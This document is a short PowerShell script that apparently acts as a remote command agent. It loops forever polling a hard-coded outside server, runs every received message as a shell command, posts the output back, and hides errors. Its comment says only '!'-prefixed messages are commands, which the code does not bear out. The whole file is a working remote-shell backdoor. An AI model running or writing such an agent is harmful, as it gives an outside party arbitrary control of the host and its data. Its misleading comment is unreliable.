param(
    [string]$Server = "https://ki8ucb.wormhole.bar"
)

function Get-SelfAndParents {
    $ids = @()
    $cur = $PID
    while ($cur -and $cur -notin $ids) {
        $p = Get-CimInstance Win32_Process -Filter "ProcessId=$cur"
        if (-not $p) { break }
        $ids += $p.ProcessId
        $cur = $p.ParentProcessId
    }
    return $ids
}

$skip = Get-SelfAndParents

# Other PowerShell processes running a .ps1 (not us, not our launchers)
$others = Get-CimInstance Win32_Process -Filter "Name='powershell.exe' OR Name='pwsh.exe'" |
    Where-Object { $_.CommandLine -match '\.ps1' -and $_.ProcessId -notin $skip }

if ($others) {
    Write-Host "Another copy is already running (PID: $($others.ProcessId -join ', ')). Exiting."
    exit
}


# Turns a received message into a reply. Messages starting with "!" are commands.
function Get-Reply([string]$text) {
	$name=$text
    try {
        $output = & $name | Out-String
        return $output.Trim()
    } catch {
        return "command failed: $name"
    }
}

$sent = New-Object 'System.Collections.Generic.HashSet[string]'
$since = 0

try {
    $msgs = Invoke-RestMethod -Uri "$Server/recv?since=$since" -Method Get
    foreach ($m in $msgs) { $since = $m.id }
} catch { }

while ($true) {
    try {
        $msgs = Invoke-RestMethod -Uri "$Server/recv?since=$since" -Method Get
        foreach ($m in $msgs) {
            $since = $m.id
            if ($sent.Contains($m.text)) { continue }

            $reply = Get-Reply $m.text
            [void]$sent.Add($reply)
            Invoke-RestMethod -Uri "$Server/send" -Method Post `
                -Body $reply -ContentType "text/plain; charset=utf-8" | Out-Null
        }
    } catch { }
    Start-Sleep -Seconds 1
}
